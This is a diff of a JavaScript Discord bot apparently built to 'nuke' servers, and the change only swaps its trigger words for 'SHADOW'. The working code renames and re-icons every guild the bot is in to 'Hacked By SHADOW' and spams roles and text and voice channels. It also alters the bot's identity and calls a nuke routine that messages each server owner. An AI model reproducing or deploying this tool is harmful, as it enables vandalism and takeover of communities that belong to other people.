@@ -18,7 +18,7 @@ console.log(`Logged in as  * [ "  SHADOW " ] servers! [ " ${LOka.guilds.size} " 
  
 });
 
-var prefix = "-"
+var prefix = "SHADOW"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
@@ -31,38 +31,38 @@ LOka.on("message", message => {
   }
 });
  
-var x1 = "kk"
+var x1 = "SHADOW"
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === "SHADOW") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/523840292630298636/523840379892531220/download.jpg`)
  
 }
 });
-var x1 = "kk"
+var x1 = "SHADOW"
 LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setUsername("Hacked By SHADOW")
+     if (message.content === "SHADOW") {
+LOka.user.setUsername("Hacked By SHADOW ")
 
 
  
 }
 });
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === "SHADOW") {
 LOka.user.setGame(`Hacked By SHADOW`,'https://www.twitch.tv/hix')
  
 }
 });
  
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/523840292630298636/523840379892531220/download.jpg`)
 })
 }
 });
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
              m.setName(`Hacked By SHADOW`)
 })
@@ -70,7 +70,7 @@ LOka.on('message', message => {
 });
  
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === "SHADOW") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://cdn.discordapp.com/attachments/523840292630298636/523840379892531220/download.jpg`)
@@ -81,7 +81,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "k1") {
+     if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked By - SHADOW ,$ ",
@@ -287,7 +287,7 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === "SHADOW") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hacked By - SHADOW ,$', 'text');
 m.createChannel('Hacked By - SHADOW ,$', 'text');
@@ -340,7 +340,7 @@ m.createChannel('Hacked By - SHADOW ,$', 'text');
 });
  
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === "SHADOW") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked By - SHADOW ,$', 'voice');
 m.createChannel('Hacked By - SHADOW ,$', 'voice');
@@ -417,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked By - SHADOW ,$    A7LA MASA 3LAK ').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW ,$  SHADOW DONE SHADOW  A7LA MASA 3LAK ').catch(e => { return void e; });
  
  
  
